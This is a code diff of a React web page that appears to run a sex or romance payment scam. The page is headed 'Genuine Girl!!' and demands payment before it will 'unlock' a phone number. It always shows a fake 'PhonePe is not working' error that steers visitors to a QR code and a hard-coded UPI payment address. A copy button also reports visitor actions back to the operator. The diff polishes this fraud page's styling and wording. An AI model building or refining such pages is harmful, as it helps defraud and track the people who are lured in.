@@ -63,8 +63,8 @@ function App() {
         <button className='button' onClick={() => { handler() }}>{btnName}</button>
         {err
           && <span>
-            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "12px", color: "red" }}>PhonePe is not Working tempoarily!!</p>
-            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "12px", color: "red" }}>Pay using UPI Address Above or use Gpay</p>
+            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "11px", color: "red" }}>PhonePe is not Working tempoarily!!</p>
+            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "11px", color: "red" }}>Pay using QR Code Above or use GPay</p>
           </span>
         }
       </div>
@@ -74,7 +74,7 @@ function App() {
   return (
     <div className="App" onClick={() => { /*setisOpen(false) */ }}>
       <header className="App-header">
-        <h1 style={{ }}>🍆Genuine Girl!!🍆</h1>
+        <h1 style={{}}>🍆Genuine Girl!!🍆</h1>
         <CopyExample />
         <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
         <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
@@ -111,9 +111,13 @@ function CopyExample() {
 
   return (
     <div className='card'>
-      <p style={{ margin: "0px", color: "mistyrose", fontWeight: 'bold' }}>Pay to my UPI Address if  "<span style={{ color: "red" }}>PAY NOW</span>" Button is Not Working👇🏻👇🏻👇🏻</p>
-      <img alt='' src='./QR.jpg'></img>
-      <div style={{ display: "flex", padding: "15px" }}>
+      <div style={{ color: "mistyrose", fontWeight: 'bold' }}>
+        <p style={{ fontSize: "15px" }}>If "<span style={{ color: "red" }}>PAY NOW</span>" Button is Not Working!!</p>
+        <p style={{ marginTop: "-20px" }}> Pay to my QR Code 👇🏻👇🏻👇🏻</p>
+      </div>
+      <img className='qr' style={{ marginTop: "-16px" }} alt='' src='./QR.jpg'></img>
+      <img style={{ marginBottom: "-10px", width: "50%" }} alt='' src='./upilogo.png'></img>
+      <div style={{ display: "flex", padding: "15px", height: "50px", margin: "-5px" }}>
         <input readOnly value={"bharatpe.0851610820@icici"}></input >
         <button className='cpybutton' onClick={async () => { setIsCopyOpen(true); await sendUpdate('Copied'); navigator.clipboard.writeText('bharatpe.0851610820@icici') }}>Copy</button>
       </div>
